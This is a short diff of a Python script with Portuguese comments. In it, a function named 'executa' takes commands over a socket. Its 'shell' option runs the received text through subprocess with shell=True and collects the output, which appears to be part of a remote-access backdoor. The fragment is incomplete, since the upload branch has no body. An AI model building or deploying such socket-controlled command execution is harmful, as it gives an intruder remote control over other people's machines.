@@ -47,9 +47,7 @@ def executa(socket):
                 try:
                     if(dados=='1'): # upload
 
-                    elif(dados=='2'):
-
-                    else:
+                    elif(dados=='2'): # shell
                         dados = ' '.join(dados)
                         comando = subprocess.Popen(dados, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
                         retorno = comando.stdout.read() + comando.stderr.read()
